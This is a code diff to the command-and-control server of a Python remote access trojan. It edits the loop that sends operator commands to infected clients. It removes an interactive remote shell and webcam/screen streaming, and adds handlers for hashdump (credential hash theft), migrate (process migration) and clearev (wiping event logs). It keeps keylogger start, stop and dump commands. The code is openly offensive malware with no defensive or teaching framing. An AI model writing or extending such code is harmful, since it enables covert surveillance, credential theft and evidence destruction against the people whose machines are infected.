@@ -118,51 +118,46 @@ def handle_client(client_socket, addr):
         print(Fore.YELLOW + f"[ * ] Command '{command}' sent to client.")
         client_socket.send(command.encode('utf-8'))
 
-        if command == "sniffer_start":
-            print(Fore.YELLOW + "[ * ] Starting network sniffer on client...")
+        # Handle the response from the client for different commands
+        if command == "hashdump":
+            print(Fore.YELLOW + "[ * ] Starting...")
+            response = client_socket.recv(4096).decode('utf-8', errors='ignore')
+            print(Fore.WHITE +  response)
 
-        if command == "shell":
-            print(Fore.YELLOW + "[ * ] Entering interactive shell mode. Type 'exit' to leave.")
-            while True:
-                shell_command = input(Fore.CYAN + "shell > ")
-                if shell_command.lower() == "exit":
-                    print(Fore.YELLOW + "[ * ] Exiting shell mode.")
-                    break
-                client_socket.send(shell_command.encode('utf-8'))
-                try:
-                    output = client_socket.recv(4096).decode('utf-8', errors='ignore')
-                except UnicodeDecodeError as e:
-                    print(Fore.RED + f"Error decoding message: {e}")
-                    continue
-                print(Fore.WHITE + output)
-            continue
+        elif command == "migrate":
+            print(Fore.YELLOW + "[ * ] Starting...")
+            response = client_socket.recv(4096).decode('utf-8', errors='ignore')
+            print(Fore.WHITE + response)
 
-        if command.startswith("webcam_stream") or command.startswith("screen_stream"):
-            mode = command.split('_')[0]
-            start_streaming(client_socket, mode)
-            continue
+        elif command == "clearev":
+            print(Fore.YELLOW + "[ * ]  Starting......")
+            response = client_socket.recv(4096).decode('utf-8', errors='ignore')
+            print(Fore.WHITE + response)
 
-        if command == "keyscan_start":
+        elif command == "upload":
+            print(Fore.YELLOW + "[ * ]  Starting...")
+            # In this case, we're not asking for file input, just sending the command to the client
+            response = client_socket.recv(4096).decode('utf-8', errors='ignore')
+            print(Fore.WHITE + response)
+
+        elif command == "keyscan_start":
             start_keylogger()
             continue
 
-        if command == "keyscan_stop":
+        elif command == "keyscan_stop":
             stop_keylogger()
             continue
 
-        if command == "keyscan_dump":
+        elif command == "keyscan_dump":
             print(Fore.WHITE + dump_keylogger_data())
             continue
 
-        # Handle webcam_list command
-        if command == "webcam_list":
+        elif command.startswith("webcam_list"):
             print(Fore.YELLOW + "[ * ] Requesting webcam list from client...")
             client_socket.send(command.encode('utf-8'))
             response = client_socket.recv(4096).decode('utf-8', errors='ignore')
             print(Fore.WHITE + "[ * ] Available Webcams:\n" + response)
-            continue
 
-        client_socket.send(command.encode('utf-8'))
 
 
 def main():
